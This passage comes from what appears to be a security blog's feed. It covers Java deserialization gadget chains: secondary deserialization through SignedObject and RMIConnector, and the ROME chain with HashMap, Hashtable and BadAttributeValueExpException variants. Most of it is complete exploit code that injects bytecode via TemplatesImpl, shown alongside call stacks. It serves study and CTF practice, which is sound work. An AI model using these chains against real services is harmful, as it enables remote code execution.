getEvilObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilObject, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//add会提前触发链条，这里选择先提前add，再统一传参</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//统一传参，防止链条被破坏</span></span><br><span class="line">        ReflectUtils.setFieldValue(priorityQueue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">SignedObject</span>[]&#123;signedObject,signedObject&#125;);</span><br><span class="line">        ReflectUtils.setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        SerialUtils.serialize(priorityQueue);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// here can be CC object or others need to deserialize.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilObject</span><span class="params">()</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="CC链触发RMIConnector"><a href="#CC链触发RMIConnector" class="headerlink" title="CC链触发RMIConnector"></a>CC链触发RMIConnector</h2><p>利用CC链命令执行的功能，去执行RMIConnector#connect方法，下面以CC6为例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMIConnector;</span><br><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> Utils.ReflectUtils.setFieldValue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// get b64string of evil object</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; evilObject = (HashMap&lt;Object, Object&gt;) getEvilObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilB64</span> <span class="operator">=</span> SerialUtils.serializeB64(evilObject);</span><br><span class="line">        <span class="comment">// put evil object into rmiConnector</span></span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span>+evilB64);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// trigger rmiConnector#connect</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(rmiConnector),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="comment">//断开链子，防止put消耗链条</span></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="comment">//把链子改回来</span></span><br><span class="line">        setFieldValue(lazyMap,<span class="string">&quot;factory&quot;</span>,chainedTransformer);</span><br><span class="line">        <span class="comment">//绕过懒加载，调用Transform</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;key2&quot;</span>);</span><br><span class="line"><span class="comment">//        SerialUtils.serialize(hashMap1);</span></span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// here can be CC object or others need to deserialize.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilObject</span><span class="params">()</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>二次反序列化，本质就是利用其他类，给我们要反序列化的对象套一层壳子。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.bmth666.cn/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/">Java二次反序列化初探@Bmth</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;题目hook resolveClass存在入口类黑名单，就可以用二次反序列化绕过，例如巅峰极客的babyurl。&lt;br&gt;本质是，A类的a方法</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="二次反序列化" scheme="https://jaspersec.top/tags/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化 ROME链</title>
    <link href="https://jaspersec.top/posts/4145469421.html"/>
    <id>https://jaspersec.top/posts/4145469421.html</id>
    <published>2023-12-24T05:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>jdk8u181</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><p>ROME反序列链的本质，是组件里的ToStringBean#toString可以任意getter调用。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700402532931-a26c4fe4-ba36-4c03-9ee7-7930802a5978.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700402550874-22686ab7-c67e-4d9a-a9fd-4952f3ba3eab.png" alt="image.png"><br>例如调getOutputProperties就是代码执行，于是问题转换成如何调ClassName#toString。<br>由此，分出许多不同利用链，本质是不同调toString的链子。<br>下面给出核心调用链，不同的部分在Exp的函数调用栈写明。<br>ClassLoader#defineClass-&gt;<br>TemplatesImpl#defineClass-&gt;<br>TemplatesImpl#defineTransletClasses-&gt;<br>TemplatesImpl#getTransletInstance-&gt;<br>TemplatesImpl#newTransformer-&gt;<br><strong>TemplatesImpl#getOutputProperties-&gt;</strong><br><strong>ToStringBean#toString-&gt;</strong><br><strong>GadgetsChains#triggerToStringFunction…..</strong></p><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">toString:137, ToStringBean</span><br><span class="line">toString:116, ToStringBean</span><br><span class="line">beanHashCode:193, EqualsBean</span><br><span class="line">hashCode:176, EqualsBean</span><br><span class="line">hash:339, HashMap</span><br><span class="line">put:612, HashMap</span><br><span class="line">main:26, ROMEHashMap</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHashMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        <span class="comment">//        ReflectUtils.setFieldValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(hashMap);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">toString:137, ToStringBean</span><br><span class="line">toString:116, ToStringBean</span><br><span class="line">beanHashCode:193, EqualsBean</span><br><span class="line">hashCode:110, ObjectBean</span><br><span class="line">put:465, Hashtable</span><br><span class="line">main:28, ROMEHashTable</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHashTable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"><span class="comment">//        ReflectUtils.setFieldValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(hashtable);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">toString:137, ToStringBean</span><br><span class="line">toString:116, ToStringBean</span><br><span class="line">readObject:86, BadAttributeValueExpException</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass</span><br><span class="line">readSerialData:2178, ObjectInputStream</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream</span><br><span class="line">readObject0:1573, ObjectInputStream</span><br><span class="line">readObject:431, ObjectInputStream</span><br><span class="line">unserialize:31, SerialUtils</span><br><span class="line">main:27, ROMEBadAttributeValueExpException</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEBadAttributeValueExpException</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"><span class="comment">//        ReflectUtils.setFieldValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(badAttributeValueExpException);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" 